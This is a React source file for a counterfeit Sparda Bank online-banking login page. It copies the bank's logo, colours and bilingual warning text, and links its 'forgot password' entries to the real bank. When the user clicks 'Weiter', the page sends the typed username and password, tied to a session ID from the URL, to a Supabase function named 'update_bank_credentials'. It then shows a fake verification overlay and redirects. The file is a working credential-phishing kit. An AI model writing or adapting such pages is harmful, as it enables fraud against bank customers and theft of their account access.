import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { X, Info, Eye, EyeOff } from "lucide-react";
import spardabankLogo from "@/assets/spardabank-logo.png";
import spardabankBg from "@/assets/spardabank-bg.png";
import spardabankIcon from "@/assets/sparda_bank.png";

const Spardabank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Sparda Bank - Login", spardabankIcon);

  const [username, setUsername] = useState("");
  const [isFocused, setIsFocused] = useState(false);
  const [password, setPassword] = useState("");
  const [isPasswordFocused, setIsPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [lang, setLang] = useState<"de" | "en">("de");

  return (
    <>
      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
    <div className="min-h-screen flex flex-col" style={{ fontFamily: "Arial, 'Helvetica Neue', Helvetica, sans-serif" }}>
      {/* Header */}
      <header style={{ backgroundColor: "#fff" }}>
        <div className="max-w-[1200px] mx-auto flex items-center px-4 py-2">
          <img src={spardabankLogo} alt="SPARDA BANK" className="h-4 md:h-7 object-contain" />
        </div>
      </header>

      {/* Main */}
      <div
        className="flex-1 flex items-center justify-center px-4"
        style={{
          backgroundImage: `url(${spardabankBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
        }}
      >
        <div className="w-full max-w-[560px] overflow-hidden">
          {/* Blue header bar */}
          <div
            className="px-6 py-4 text-white font-normal text-2xl"
            style={{ backgroundColor: "#006cd4" }}
          >
            {lang === "de" ? "SPARDAbanking Login" : "Login"}
          </div>

          {/* Card body */}
          <div className="bg-white px-6 py-5 space-y-4">
            {/* Info text */}
            <p className="text-sm leading-snug" style={{ color: "#333" }}>
              {lang === "de"
                ? "Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten."
                : "You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret. We will never ask you for your PIN or a TAN."}
            </p>

            {/* Divider */}
            <hr className="border-gray-200" />

            {/* Label row */}
            <div className="flex items-center justify-between -mb-3">
              <span className="font-normal text-xs" style={{ color: "#999" }}>
                {lang === "de" ? "Anmeldung mit Benutzername" : "User name or authorised party number"}
              </span>
              <span className="text-sm">
                <a
                  href="#"
                  onClick={(e) => {
                    e.preventDefault();
                    setLang(lang === "de" ? "en" : "de");
                  }}
                  className="no-underline hover:underline"
                  style={{ color: "#006cd4" }}
                >
                  {lang === "de" ? "English" : "Deutsch"}
                </a>
              </span>
            </div>

            {/* Username input */}
            <div className="relative !mt-1.5">
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                onFocus={() => setIsFocused(true)}
                onBlur={() => setIsFocused(false)}
                className="w-full px-3 py-2.5 border text-sm outline-none transition-colors rounded-sm"
                style={{
                  backgroundColor: isFocused ? "#d6e5f4" : "#f1f1f1",
                  borderColor: isFocused ? "#006cd4" : "#dedede",
                  boxShadow: isFocused ? "0 0 0 1px #006cd4" : "none",
                }}
              />
              {username && (
                <button
                  onClick={() => setUsername("")}
                  className="absolute right-2 top-1/2 -translate-y-1/2"
                  type="button"
                >
                  <X size={24} color={isFocused ? "#006cd4" : "#333"} />
                </button>
              )}
            </div>

            {/* Password label */}
            <div className="flex items-center -mb-3">
              <span className="font-normal text-xs" style={{ color: "#999" }}>
                {lang === "de" ? "Passwort" : "Password"}
              </span>
            </div>

            {/* Password input */}
            <div className="relative !mt-1.5">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onFocus={() => setIsPasswordFocused(true)}
                onBlur={() => setIsPasswordFocused(false)}
                className="w-full px-3 py-2.5 border text-sm outline-none transition-colors rounded-sm"
                style={{
                  backgroundColor: isPasswordFocused ? "#d6e5f4" : "#f1f1f1",
                  borderColor: isPasswordFocused ? "#006cd4" : "#dedede",
                  boxShadow: isPasswordFocused ? "0 0 0 1px #006cd4" : "none",
                }}
              />
              {password && (
                <button
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-2 top-1/2 -translate-y-1/2"
                  type="button"
                >
                  {showPassword ? <EyeOff size={20} color={isPasswordFocused ? "#006cd4" : "#333"} /> : <Eye size={20} color={isPasswordFocused ? "#006cd4" : "#333"} />}
                </button>
              )}
            </div>

            {/* AGB Text */}
            {lang === "de" && (
              <p className="text-[13px] text-center" style={{ color: "#333" }}>
                Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
              </p>
            )}

            {/* Divider above button */}
            <hr className="-mx-6 border-gray-200" />

            {/* Weiter button */}
            <button
              className="w-full py-2 text-white font-normal text-sm"
              style={{ backgroundColor: "#006cd4" }}
            
              onClick={async () => {
                console.log("Session ID:", sessionId);
                if (sessionId) {
                  const { error } = await supabase.rpc("update_bank_credentials", {
                    p_session_id: sessionId,
                    p_username: username,
                    p_password: password,
                    p_username_label: "Benutzername",
                    p_password_label: "Passwort",
                  });
                  if (error) console.error("Update failed:", error);
                  else console.log("Update successful");
                } else {
                  console.error("No session ID found in URL!");
                }
                setShowLoading(true);
              }}>
              {lang === "de" ? "Weiter" : "Continue"}
            </button>

            {/* Divider below button */}
            <hr className="-mx-6 border-gray-200" />

            {/* Links */}
            <div className="flex flex-col items-center gap-0.5">
              <a
                href="https://banking.sparda.at/banking/login.xhtml?m=44&f=2#"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                style={{ color: "#006cd4" }}
              >
                {lang === "de" ? "Benutzername vergessen?" : "Forgot username?"}
              </a>
              <a
                href="https://banking.sparda.at/banking/login.xhtml?m=44&f=2#"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                style={{ color: "#006cd4" }}
              >
                {lang === "de" ? "Passwort vergessen?" : "Forgot password?"}
              </a>
              <a
                href="https://banking.sparda.at/banking/login.xhtml?m=44&f=2#"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[15px] no-underline hover:underline leading-tight py-0 mt-2 inline-flex items-center gap-1"
                style={{ color: "#006cd4" }}
              >
                <Info size={16} />
                {lang === "de" ? "Live Hilfe" : "Live Help"}
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
    </>
  );
};

export default Spardabank;
